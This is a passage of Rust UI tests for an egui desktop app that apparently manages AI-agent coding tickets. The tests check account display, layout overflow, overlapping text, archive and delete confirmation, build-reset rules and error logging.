            context.set_visuals(if dark {
                egui::Visuals::dark()
            } else {
                egui::Visuals::light()
            });
            for width in [1500.0_f32, 520.0] {
                for (name, present, absent) in cases {
                    app.open(&autopilot_core::TicketId::from(name));
                    let page = page_text(&mut app, &context, width).replace('\n', " ");
                    if std::env::var_os("SHOW_PAGES").is_some() && !dark {
                        eprintln!("=== {name}\n{page}");
                    }
                    for want in present {
                        assert!(
                            page.contains(want),
                            "{name} at {width}: missing {want:?} in {page}"
                        );
                    }
                    for refuse in absent {
                        assert!(
                            !page.contains(refuse),
                            "{name} at {width}: shows {refuse:?}"
                        );
                    }
                }
            }
        }
    }

    fn github_only(accounts: Vec<(&str, bool, bool)>) -> autopilot_accounts::Accounts {
        use autopilot_accounts::{GithubAccount, Status};
        let github = if accounts.is_empty() {
            Status::SignedOut
        } else {
            Status::SignedIn(
                accounts
                    .into_iter()
                    .map(|(login, active, valid)| GithubAccount {
                        host: "github.com".into(),
                        login: login.into(),
                        active,
                        valid,
                    })
                    .collect(),
            )
        };
        autopilot_accounts::Accounts {
            claude: Status::SignedOut,
            codex: Status::SignedOut,
            github,
            azure: Status::SignedOut,
            azure_all: vec![],
        }
    }

    // Invariant: the first-run Tools screen, the Settings accounts page and the
    // tooltip of the GitHub icon all say WHICH GitHub account is connected, the
    // active one marked, and a second account offers a selector. A row that
    // said only "Connected" would leave the owner guessing which account
    // opens the pull request.
    #[test]
    fn every_account_view_names_the_github_account() {
        type Case<'a> = (Vec<(&'a str, bool, bool)>, &'a [&'a str], &'a [&'a str]);
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let cases: [Case; 4] = [
            (
                vec![("robbertpopa", true, true)],
                &["robbertpopa on github.com (active)", "Connected"],
                &["Use"],
            ),
            (
                vec![("robbertpopa", true, true), ("sheila-dot", false, true)],
                &[
                    "robbertpopa on github.com (active)",
                    "sheila-dot on github.com",
                    "Use",
                ],
                &[],
            ),
            (
                vec![("old-login", true, false)],
                &[
                    "old-login on github.com (active) (token rejected)",
                    "Not signed in",
                ],
                &[],
            ),
            (
                vec![],
                &["Not signed in", "gh auth login"],
                &["on github.com"],
            ),
        ];
        for (accounts, present, absent) in cases {
            let rows = accounts::rows(&github_only(accounts.clone()));
            let tip = nav::tooltip(&rows[0]);
            app.accounts = Some(github_only(accounts));
            app.welcome_step = 1;
            let first_run = drawn_text(&mut app, &context);
            app.welcome_step = 0;
            app.mode = Mode::Accounts;
            app.welcomed = true;
            let settings = drawn_text(&mut app, &context);
            app.welcomed = false;
            for want in present {
                assert!(
                    first_run.contains(want),
                    "first run lacks {want:?}: {first_run}"
                );
                if *want != "Connected" && *want != "Use" && !want.starts_with("Not signed") {
                    assert!(
                        settings.contains(want),
                        "settings lacks {want:?}: {settings}"
                    );
                    assert!(tip.contains(want), "the icon lacks {want:?}: {tip}");
                }
            }
            for refuse in absent {
                assert!(!first_run.contains(refuse), "first run shows {refuse:?}");
            }
        }
    }

    // Invariant: nothing a page draws reaches past the right edge of the window,
    // in both palettes, at the usual width and at a narrow one. A long request
    // in the Inbox card once widened the whole page, so its right side was cut
    // off and "open" ran under the title; no other test measures where things
    // are drawn.
    #[test]
    fn no_page_is_drawn_past_the_window_edge() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        demo::seed_build_states(&options.data_dir, now_ms()).unwrap();
        backend::mark_welcomed(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        for light in [false, true] {
            theme::apply(&context, light);
            for width in [1280.0_f32, 980.0] {
                let input = egui::RawInput {
                    screen_rect: Some(egui::Rect::from_min_size(
                        egui::pos2(0.0, 0.0),
                        egui::vec2(width, 832.0),
                    )),
                    ..Default::default()
                };
                let pages = [
                    (Mode::Today, None),
                    (Mode::Watch, Some("demo-stopped")),
                    (Mode::Watch, Some("demo-asked")),
                    (Mode::Watch, Some("demo-timezone")),
                ];
                for (mode, ticket) in pages {
                    app.mode = mode;
                    match ticket {
                        Some(name) => app.open(&autopilot_core::TicketId::from(name)),
                        None => app.selected = None,
                    }
                    let mut output = None;
                    for _ in 0..3 {
                        output = Some(context.run(input.clone(), |context| app.ui(context)));
                    }
                    for clipped in output.unwrap().shapes {
                        let bounds = clipped.shape.visual_bounding_rect();
                        assert!(
                            bounds.max.x.is_nan() || bounds.max.x <= width + 3.0,
                            "{mode:?} {ticket:?} light={light} width={width}: a shape ends at {} {:?}",
                            bounds.max.x,
                            clipped.shape
                        );
                    }
                }
            }
        }
        theme::apply(&context, false);
    }

    // Invariant: a ticket started in a project names that project from its
    // first event, before the agent has read anything. Recorded after
    // Understand, the sidebar listed a new ticket under "no project" for as long
    // as that step ran (the whole first turn of a real agent).
    #[test]
    fn a_new_ticket_names_its_project_before_understand_runs() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        perform(
            &options,
            &Action::Start {
                title: "In a project".into(),
                description: "Add an export option".into(),
                attachments: Vec::new(),
                workspace: Some(directory.path().to_path_buf()),
                pipeline: None,
            },
        )
        .unwrap();
        let id = read(&options).tickets[0].id.clone();
        let history = autopilot_engine::watch(&options.data_dir, &id, 0).unwrap();
        let at = |wanted: fn(&autopilot_core::Event) -> bool| {
            history.iter().position(|record| wanted(&record.event.kind))
        };
        let workspace = at(|kind| matches!(kind, autopilot_core::Event::Workspace { .. }));
        let started = at(|kind| matches!(kind, autopilot_core::Event::StepStarted { .. }));
        assert!(workspace.is_some() && started.is_some());
        assert!(workspace < started, "{workspace:?} before {started:?}");
    }

    // Invariant: the sidebar paints the whole width it takes, whatever the
    // project is called. A long project name once widened its content past the
    // panel, so the frame grew beyond the part that was painted and a black strip
    // showed between the sidebar and the page; nothing else measures the two
    // panels against each other.
    #[test]
    fn a_long_project_name_does_not_leave_a_gap_beside_the_sidebar() {
        let directory = tempfile::tempdir().unwrap();
        let project = directory
            .path()
            .join("a-project-with-a-very-long-name-that-keeps-on-going-and-going");
        std::fs::create_dir_all(&project).unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        backend::mark_welcomed(&options.data_dir);
        perform(
            &options,
            &Action::Start {
                title: "Long".into(),
                description: "Add an export option".into(),
                attachments: Vec::new(),
                workspace: Some(project),
                pipeline: None,
            },
        )
        .unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        app.mode = Mode::Today;
        let input = egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::pos2(0.0, 0.0),
                egui::vec2(1280.0, 832.0),
            )),
            ..Default::default()
        };
        let mut output = None;
        for _ in 0..3 {
            output = Some(context.run(input.clone(), |context| app.ui(context)));
        }
        // On macOS the panels start under the slim title row.
        let title = if cfg!(target_os = "macos") {
            nav::TITLE_HEIGHT
        } else {
            0.0
        };
        let panels: Vec<(egui::Rect, egui::Color32)> = output
            .unwrap()
            .shapes
            .iter()
            .filter_map(|clipped| match &clipped.shape {
                egui::Shape::Rect(rect)
                    if rect.rect.height() >= 832.0 - title
                        && rect.rect.min.x >= 0.0
                        && rect.rect.width() < 1280.0 =>
                {
                    Some((rect.rect, rect.fill))
                }
                _ => None,
            })
            .collect();
        let nav = &panels
            .iter()
            .find(|(_, fill)| *fill == theme::SIDEBAR())
            .unwrap()
            .0;
        let page = &panels
            .iter()
            .find(|(rect, fill)| *fill == theme::BACKGROUND() && rect.min.x > 0.0)
            .unwrap()
            .0;
        assert!(nav.max.x <= 226.5, "the sidebar grew to {}", nav.max.x);
        assert_eq!(nav.max.x, page.min.x, "a gap between the panels");
    }

    // Invariant: the ticket page shows each step's plan as a checklist that
    // follows the log: the step that is next shows its items unticked before it
    // starts, the running one marks where it is, a finished one shows what it
    // did, a stopped one shows where and why. A page that listed only step names
    // left the owner unable to tell what a step would do or where it stopped.
    #[test]
    fn the_ticket_page_shows_each_steps_plan_before_during_and_after() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        backend::mark_welcomed(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        demo::seed_build_states(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let cases: [(&str, &[&str]); 5] = [
            // Next step, not started: its items are listed.
            (
                "demo-approved",
                &[
                    "Plan",
                    "Build turn",
                    "Checks, cheapest first",
                    "Review of the change",
                ],
            ),
            // Running: where it is, and what ran.
            (
                "demo-timezone",
                &[
                    "Round 1: build turn",
                    "Round 1: tests",
                    "Next: the following check or turn",
                    "in progress",
                ],
            ),
            // Finished: what it did, in the step's own page.
            ("demo-passed", &["Round 1: build turn", "Round 1: tests"]),
            // Stopped for the owner.
            (
                "demo-stopped",
                &["Round 1: review", "Next: the following check or turn"],
            ),
            // Failed: where and why.
            (
                "demo-csrf",
                &[
                    "Read your request and attachments",
                    "stopped: the agent stopped after 20 turns",
                ],
            ),
        ];
        for (name, wanted) in cases {
            app.open(&autopilot_core::TicketId::from(name));
            if name == "demo-passed" {
                app.screen = Screen::Step(Step::BuildCheck);
            }
            let page = page_text(&mut app, &context, 1280.0).replace('\n', " ");
            for text in wanted {
                assert!(page.contains(text), "{name} lacks {text:?}: {page}");
            }
        }
    }

    // Invariant: archiving hides a ticket from the lists but keeps it
    // restorable from the Archived section; delete asks first and then lists
    // the ticket nowhere; a running ticket can be neither. Without the
    // confirmation a stray click would remove a ticket, and archive must not
    // lose the ticket or its history.
    #[test]
    fn archive_restore_and_delete_work_from_the_window_and_delete_asks_first() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        backend::mark_welcomed(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        demo::seed_build_states(&options.data_dir, now_ms()).unwrap();
        let passed = autopilot_core::TicketId::from("demo-passed");
        let running = autopilot_core::TicketId::from("demo-timezone");
        let count = |options: &Options| (read(options).tickets.len(), read(options).archived.len());
        let (listed, _) = count(&options);

        perform(&options, &Action::Archive(passed.clone())).unwrap();
        assert_eq!(count(&options), (listed - 1, 1));
        assert!(perform(&options, &Action::Archive(running.clone())).is_err());
        assert!(perform(&options, &Action::Delete(running.clone())).is_err());
        perform(&options, &Action::Restore(passed.clone())).unwrap();
        assert_eq!(count(&options), (listed, 0));

        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        app.apply_choice(Some(ticket_menu::Choice::ConfirmDelete(passed.clone())));
        let _ = drawn_text(&mut app, &context);
        let asked = drawn_text(&mut app, &context);
        assert!(asked.contains("Delete this ticket?"), "{asked}");
        assert_eq!(count(&options), (listed, 0), "nothing is deleted by asking");

        perform(&options, &Action::Delete(passed.clone())).unwrap();
        assert_eq!(count(&options), (listed - 1, 0));
        let history = autopilot_engine::watch(&options.data_dir, &passed, 0).unwrap();
        assert!(!history.is_empty(), "the history stays");

        // An archived ticket is listed apart and its page offers the way back.
        let away = autopilot_core::TicketId::from("demo-approved");
        perform(&options, &Action::Archive(away.clone())).unwrap();
        app.set_snapshot(read(&options));
        let list = drawn_text(&mut app, &context);
        assert!(list.contains("Archived  1"), "{list}");
        app.open(&away);
        let _ = drawn_text(&mut app, &context);
        let page = drawn_text(&mut app, &context);
        assert!(page.contains("Archived: hidden from the lists."), "{page}");
        assert!(page.contains("Restore"), "{page}");
    }

    // Invariant: a stopped ticket offers to carry on from the step that
    // stopped, and a ticket that did not stop offers nothing to resume.
    #[test]
    fn a_stopped_ticket_resumes_from_its_stopped_step() {
        let directory = tempfile::tempdir().unwrap();
        demo::seed(directory.path(), now_ms()).unwrap();
        let failed = autopilot_engine::load_ticket(
            directory.path(),
            &autopilot_core::TicketId::from("demo-csrf"),
        )
        .unwrap();
        assert!(matches!(
            ticket_menu::resume_action(&failed),
            Some(Action::RerunUnderstand(_))
        ));
        let building = autopilot_engine::load_ticket(
            directory.path(),
            &autopilot_core::TicketId::from("demo-timezone"),
        )
        .unwrap();
        assert!(ticket_menu::resume_action(&building).is_none());
    }

    // Invariant: the whole window is painted with the page colour before any
    // panel, in both palettes, so a part no panel covers (a gap between
    // panels, a panel shorter than the window) never shows the window's black.
    // A black band of 8 to 35 px beside the sidebar was seen on the installed
    // app with every page; the panel code left it unpainted.
    #[test]
    fn the_window_is_painted_end_to_end_before_any_panel() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        backend::mark_welcomed(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        for light in [false, true] {
            theme::apply(&context, light);
            for (width, height) in [(1070.0_f32, 365.0_f32), (1280.0, 832.0)] {
                let screen =
                    egui::Rect::from_min_size(egui::pos2(0.0, 0.0), egui::vec2(width, height));
                let input = egui::RawInput {
                    screen_rect: Some(screen),
                    ..Default::default()
                };
                let mut output = None;
                for _ in 0..3 {
                    output = Some(context.run(input.clone(), |context| app.ui(context)));
                }
                let first =
                    output
                        .unwrap()
                        .shapes
                        .into_iter()
                        .find_map(|clipped| match clipped.shape {
                            egui::Shape::Rect(rect) => Some(rect),
                            _ => None,
                        });
                let first = first.expect("a rect is drawn");
                assert_eq!(first.rect, screen, "light={light} {width}x{height}");
                assert_eq!(first.fill, theme::BACKGROUND());
            }
        }
        theme::apply(&context, false);
    }

    // Invariant: when the sidebar's content is wider than its panel (here, text
    // drawn larger than the layout allows for), the band between the painted
    // sidebar and the page is painted as sidebar. Left alone it showed the
    // window's black on the installed app, whose fonts are wider than the test
    // fonts; no other test can force the overflow.
    #[test]
    fn a_sidebar_wider_than_its_panel_leaves_no_unpainted_band() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        backend::mark_welcomed(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        context.all_styles_mut(|style| {
            for font in style.text_styles.values_mut() {
                font.size *= 1.6;
            }
        });
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let screen = egui::Rect::from_min_size(egui::pos2(0.0, 0.0), egui::vec2(1280.0, 832.0));
        let input = egui::RawInput {
            screen_rect: Some(screen),
            ..Default::default()
        };
        let mut output = None;
        for _ in 0..3 {
            output = Some(context.run(input.clone(), |context| app.ui(context)));
        }
        let rects: Vec<(egui::Rect, egui::Color32)> = output
            .unwrap()
            .shapes
            .iter()
            .filter_map(|clipped| match &clipped.shape {
                egui::Shape::Rect(rect) if rect.rect.height() > 300.0 => {
                    Some((rect.rect, rect.fill))
                }
                _ => None,
            })
            .collect();
        let page = rects
            .iter()
            .filter(|(rect, fill)| rect.min.x > 100.0 && *fill == theme::BACKGROUND())
            .map(|(rect, _)| rect.min.x)
            .fold(f32::MAX, f32::min);
        // Every x from the sidebar's left edge to the page is covered by a
        // sidebar-coloured rect.
        let mut x = 0.0_f32;
        while x < page {
            assert!(
                rects.iter().any(|(rect, fill)| *fill == theme::SIDEBAR()
                    && rect.min.x <= x
                    && x <= rect.max.x),
                "x={x} is not sidebar (page starts at {page}): {rects:?}"
            );
            x += 2.0;
        }
    }

    // Invariant: no two pieces of text on a page are drawn over each other, in
    // either palette, at the usual width and at narrower ones. The status pill
    // was drawn over the Stop button, the step state over the step's name, and
    // a mark over its own text; each looked like a stray overprint. Nothing else
    // measures text against text.
    #[test]
    fn no_two_texts_overlap_on_any_page() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        backend::mark_welcomed(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        demo::seed_build_states(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let mut found = Vec::new();
        for light in [false, true] {
            theme::apply(&context, light);
            for width in [1280.0_f32, 1070.0, 980.0] {
                let input = egui::RawInput {
                    screen_rect: Some(egui::Rect::from_min_size(
                        egui::pos2(0.0, 0.0),
                        egui::vec2(width, 900.0),
                    )),
                    ..Default::default()
                };
                let mut pages = vec![(Mode::Today, None)];
                pages.extend(
                    [
                        "demo-timezone",
                        "demo-heartbeat",
                        "demo-csrf",
                        "demo-approved",
                        "demo-stopped",
                        "demo-passed",
                        "demo-asked",
                        "demo-approved-pr",
                        "demo-opened",
                    ]
                    .map(|name| (Mode::Watch, Some(name))),
                );
                for (mode, ticket) in pages {
                    app.mode = mode;
                    match ticket {
                        Some(name) => app.open(&autopilot_core::TicketId::from(name)),
                        None => app.selected = None,
                    }
                    let mut output = None;
                    for _ in 0..3 {
                        output = Some(context.run(input.clone(), |context| app.ui(context)));
                    }
                    let mut texts = Vec::new();
                    for clipped in output.unwrap().shapes {
                        if let egui::Shape::Text(text) = &clipped.shape {
                            let rect = egui::Rect::from_min_size(text.pos, text.galley.size())
                                .intersect(clipped.clip_rect);
                            if rect.width() > 0.0
                                && rect.height() > 0.0
                                && !text.galley.text().trim().is_empty()
                            {
                                texts.push((rect, text.galley.text().to_owned()));
                            }
                        }
                    }
                    for (index, (first, one)) in texts.iter().enumerate() {
                        for (second, other) in &texts[index + 1..] {
                            let both = first.intersect(*second);
                            if both.width() > 2.0 && both.height() > 3.0 {
                                found.push(format!(
                                    "light={light} {width} {mode:?} {ticket:?}: {one:?} over {other:?}"
                                ));
                            }
                        }
                    }
                }
            }
        }
        theme::apply(&context, false);
        assert!(found.is_empty(), "{} overlaps: {:#?}", found.len(), found);
    }

    // Invariant: an action that fails in the window leaves a line in the log,
    // because the release window has no console. It fails if `backend::run`
    // stops recording a failed outcome.
    #[test]
    fn a_failed_action_writes_one_line_to_the_log() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        let (sender, receiver) = std::sync::mpsc::channel();
        backend::run(
            1,
            options.clone(),
            backend::Action::OpenWorktree(autopilot_core::TicketId::from("nothing")),
            egui::Context::default(),
            sender,
        );
        let done = receiver
            .recv_timeout(std::time::Duration::from_secs(20))
            .unwrap();
        assert!(matches!(done, backend::Message::Done(_, Err(_))));
        let text = std::fs::read_to_string(error_log::path(&options.data_dir)).unwrap();
        assert_eq!(text.lines().count(), 1, "{text:?}");
        assert!(text.contains("no copy of the project"), "{text:?}");
    }

    // Invariant: the window offers to reset a Build only when it has run, no
    // step holds the ticket and no pull request was asked for, because a reset
    // deletes the copy of the project. It fails if the rule is loosened so that
    // a Build waiting for the owner, an unbuilt ticket or an asked-for pull
    // request can be reset.
    #[test]
    fn a_build_can_be_reset_only_when_it_has_run_and_nothing_depends_on_it() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        demo::seed_build_states(&options.data_dir, now_ms()).unwrap();
        let snapshot = read(&options);
        let refusal = |id: &str| {
            let view = snapshot
                .tickets
                .iter()
                .find(|view| view.id.as_str() == id)
                .unwrap_or_else(|| panic!("no demo ticket {id}"));
            build_actions::reset_refusal(view)
        };
        assert_eq!(refusal("demo-passed"), None);
        assert!(refusal("demo-approved").unwrap().contains("not run"));
        assert!(refusal("demo-asked").unwrap().contains("waiting for you"));
        assert!(refusal("demo-opened").unwrap().contains("pull request"));
        assert!(refusal("demo-approved-pr").is_some());
        assert!(
            refusal("demo-stopped")
                .unwrap()
                .contains("running or waiting")
        );
    }

    // Invariant: a terminal is started only in a ticket's own copy of the
    // project. Without one the action says why and starts nothing; it fails if
    // the action falls back to another folder (the data folder, the home
    // folder) when the copy is missing.
    #[test]
    fn a_terminal_is_not_opened_for_a_ticket_without_a_copy_of_the_project() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        let error = backend::perform(
            &options,
            &backend::Action::OpenTerminal(autopilot_core::TicketId::from("nothing")),
        )
        .unwrap_err();
        assert_eq!(error, backend::NO_WORKTREE);
    }

    // Invariant: a notice describes the ticket that was open when it showed. A
    // notice kept for the whole window would tell the owner that ticket B did
    // what ticket A did. It fails if `notice` is shown again after the owner
    // opens another ticket.
    #[test]
    fn a_notice_does_not_follow_the_owner_to_another_ticket() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let first = app.snapshot.tickets[0].id.clone();
        let second = app.snapshot.tickets[1].id.clone();
        app.open(&first);
        frame(&mut app, &context);
        app.notice = Some((true, "Opened the mockups".to_owned()));
        frame(&mut app, &context);
        assert!(app.notice.is_some(), "the notice stays on its own ticket");
        app.open(&second);
        frame(&mut app, &context);
        assert_eq!(app.notice, None);
    }

    // Invariant: on the plan review page at about 900 px, no text is drawn past
    // the window's right edge, even for a long criterion or verification id. A
    // criterion in one row with its pill ran off the screen. The overlap test
    // does not look at the edge.
    #[test]
    fn plan_review_rows_stay_inside_a_narrow_window() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        backend::mark_welcomed(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let width = 900.0_f32;
        let input = egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::pos2(0.0, 0.0),
                egui::vec2(width, 900.0),
            )),
            ..Default::default()
        };
        let mut checked = 0;
        for index in 0..app.snapshot.tickets.len() {
            let id = app.snapshot.tickets[index].id.clone();
            app.open(&id);
            app.mode = Mode::PlanReview;
            let mut output = None;
            for _ in 0..3 {
                output = Some(context.run(input.clone(), |context| app.ui(context)));
            }
            for clipped in output.unwrap().shapes {
                if let egui::Shape::Text(text) = &clipped.shape {
                    let right = text.pos.x + text.galley.size().x;
                    assert!(
                        right <= width,
                        "{:?} ends at {right}, past {width}",
                        text.galley.text()
                    );
                    checked += 1;
                }
            }
        }
        assert!(checked > 20, "{checked} texts drawn");
    }
}
